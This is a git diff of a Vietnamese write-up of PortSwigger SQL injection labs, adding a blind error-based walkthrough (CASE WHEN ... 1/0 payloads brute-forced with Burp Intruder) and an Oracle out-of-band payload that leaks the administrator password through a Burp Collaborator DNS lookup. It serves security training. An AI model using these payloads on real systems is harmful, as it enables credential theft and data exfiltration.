@@ -1,5 +1,3 @@
-<img width="1484" height="713" alt="image" src="https://github.com/user-attachments/assets/11f2611c-1195-43a0-81f6-402136744f6e" /><img width="1483" height="811" alt="image" src="https://github.com/user-attachments/assets/6d1f6a74-d046-4136-a185-68dd872c0584" /># Write-up-All-labs-SQL-injection-PortSwigger
-
 
 # Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
@@ -401,6 +399,60 @@ Và chúng ta solved được Challenge này!!
 
 <img width="1478" height="540" alt="image" src="https://github.com/user-attachments/assets/7a74682d-6d3e-42f7-ae01-0d452acf1f9e" />
 
+# Lab 12: Blind SQL injection with conditional errors
+
+<img width="1147" height="677" alt="image" src="https://github.com/user-attachments/assets/825354f7-02a8-41d9-b470-d134d538dce1" />
+
+Theo mô tả của đề bài thì , Lab này vẫn chứa lỗ hổng với câu truy vấn sử dụng giá trị của Cookie . Kết quả của truy vấn dù có hay không thì nó cũng không hiển thị ra màn hình và sẽ không hiển thị khác nhau . Nếu có lỗi thì nó sẽ báo chung một thông báo lỗi tùy chỉnh 
+
+Vậy tức là cho bạn có truyền truy vấn vào , dù có kết quả hay không có kết quả thì nó vẫn sẽ không hiển thị gì để phân biệt . Nhưng ở đây vẫn có thể phân biệt được giữa truy vấn nó lỗi và truy vấn hợp lệ mà 
+
+Giả sử chúng ta có thể điều khiển được nếu length(password) = 20 thì trả về 1/0 => lúc này hệ quả trị csdl sẽ phải thực hiện 1/0 => lỗi truy vấn ngay . Còn nếu length(password) != 20 thì trả về một cái gì đó hợp lệ để không lỗi truy vấn thôi 
+
+Cái chúng ta cần lúc này:
+```sql
+case when (length((select password from users where username = 'administrator')) = 20 then 1 else 1/0)
+```
+Payload truyền vào kiểm tra độ dài password 
+```
+' or case when (length((select password from users where username = 'administrator')) = 20 then 1 else 1/0) = 1 --
+```
+vì sao lại phải có thêm cái = 1 kia ? Bản chất của cái Where kia nó luôn luôn là so sánh điều kiện có đúng hay không . Cho nên chúng ta mới phải cho so sánh với 1 . Thực ra ở đây bạn cho so sánh với bất cứ cái gì cũng được , miễn là không lỗi cũ pháp 
+
+Và kết quả là:
+
+<img width="1503" height="818" alt="image" src="https://github.com/user-attachments/assets/4470ad51-b08d-45ae-a968-2b1b0e5ed61d" />
+
+Độ dài password có độ dài 20 kí tự do web không trả về lỗi server 
+
+Tiếp theo , cái chúng ta cần là xác định kí tự từng vị trí:
+```sql
+' or case when (substring((select password from users where username = 'administrator'),1,1) = 'a' then 1 else 1/0) = 1 --
+```
+Nếu kí tự ở vị trí thứ nhất của password là chữ a thì trả về số 1 , còn không phải thì lấy 1/0 là lỗi server ngay 
+
+Add to instruder , chọn cluster bomb attack 
+
+Setting như hình 
+
+<img width="1920" height="612" alt="image" src="https://github.com/user-attachments/assets/93c70b49-259a-4559-910f-55e4982d5af8" />
+
+<img width="1920" height="526" alt="image" src="https://github.com/user-attachments/assets/9de1732d-2db3-4c45-88dd-984b4701617b" />
+
+Và start attack , dựa vào độ dài của Response để xác định 
+
+<img width="1874" height="1009" alt="image" src="https://github.com/user-attachments/assets/4d9f8305-a9ee-44f1-b5c7-f76486953b50" />
+
+Nhìn vào kết quả trả về , ở cột length có độ dài 11549 là những chỗ có kí tự hợp lệ 
+
+Vậy lắp lại password và login thôi:
+```
+password:11oow2jtpqkl9d44dosf
+```
+<img width="1523" height="711" alt="image" src="https://github.com/user-attachments/assets/156e1985-13e1-4a13-92eb-6a5a52c005ec" />
+
+Và login thành công , chúng ta Solved được Challenge này !
+
 # Lab 14: Blind SQL injection with out-of-band interaction
 
 <img width="1111" height="819" alt="image" src="https://github.com/user-attachments/assets/62b049a4-4c29-4945-9efe-a93dfb795e75" />
@@ -446,17 +498,41 @@ Câu lệnh lấy password chúng ta cần
 ```sql
 select password from users where username = 'administrator'
 ```
-Vậy cái này có thể chèn vào đâu ? Chúng ta phải nối chuỗi kết quả câu lệnh lấy password nó gắn vào cái subdomain burp collaborator của chúng ta , nối chuỗi bằng dấu || vì đây đang dùng hệ quản trị cơ sở dữ liệu oracle
 
-vậy lúc này payload sẽ là 
-```sql
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||select password from users where username = 'administrator'||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+Bạn cứ hiểu như thế này câu truy vấn trên nó có chức năng là phân giải tên miền thành địa chỉ IP , để làm được điều này thì hệ quản trị cơ sở dữ liệu sẽ phải gửi truy vấn DNS đến DNS Server quản lí cái domain đó 
 ```
+   			DNS Query: abc123.collab.net
+Oracle DB -----------------------------------> DNS Server: collab.net
+```
+Giả sử bạn nạp câu truy vấn trên vào DB thì không khác gì hỏi nó `abc123.collab.net` có địa chỉ IP là bao nhiêu ? Thì lúc này Oracle DB sẽ gửi 1 cái `abc123.collab.net` đến `collab.net` và lúc này `collab.net` nó biết được Oracle DB vừa hỏi `abc123.collab.net` có địa chỉ IP là bao nhiêu và nó lưu lại tại đó 
 
-<img width="1142" height="669" alt="image" src="https://github.com/user-attachments/assets/4a723cf2-edb7-4872-9b02-62f554f82da9" />
+Tương tự bài này , nếu chúng ta thêm subdomain là kết quả trả về của câu lệnh lấy password chèn vào trong cái domain chính của burp collaborator thì nó sẽ lấy Full Domain Name đó gửi lên Domain chính của burp collaborator và lúc này tại server burp collaborator thì chúng ta thấy được cái Full Domain Name đó , ở trong đó bao gồm cả mật khẩu administrator rồi
 
-`password:uw2m2f599wxa5od9tkw7`
+Vậy để chèn vào như thế thì chúng ta chỉ có thể nối chuỗi bằng dấu `||` bởi vì hệ quản trị csdl ở đây là Oracle
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username = 'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+Cơ chế hoạt động của nó lúc này , đầu tiên Oracle sẽ thực hiện câu truy vấn ở trong trước sẽ ra mật khẩu là `abcxyz` rồi nó nối vào domain của burp collab , dạng thế này 
+```
+abcxyz.burpcollab.net
+```
+Rồi thực hiện việc phân giải FUll Domain name đó bằng cách gửi truy vấn DNS lên DNS Server của burp collab, lúc này tại DNS Server của burp collab sẽ lưu lại cái Full Domain Name đó , và cái mật khẩu của administrator đã được kẹp vào trong đó được ngăn cách bởi dấu chấm 
 
+<img width="1488" height="666" alt="image" src="https://github.com/user-attachments/assets/aa4295c5-b0c5-4aa4-9b03-d9c849a599ff" />
+
+Tại Collab mình đã bắt được 5 truy vấn , và cái Full Domain Name đó đã gửi lên và kẹp cả mật khẩu đây 
+
+<img width="1142" height="618" alt="image" src="https://github.com/user-attachments/assets/4c619956-3770-4954-a411-76b051d1c2b1" />
+
+Lấy nó và login thôi!!
+```
+password: e4eief3azbgub24ugcoz
+```
+<img width="913" height="396" alt="image" src="https://github.com/user-attachments/assets/3344bde2-27e6-46ae-9c9e-c51f789ed20d" />
+
+Chúng ta Solved được Challenge này
+
+<img width="1462" height="688" alt="image" src="https://github.com/user-attachments/assets/11767384-ed84-446f-b2ba-a36bc70086aa" />
 
 
 
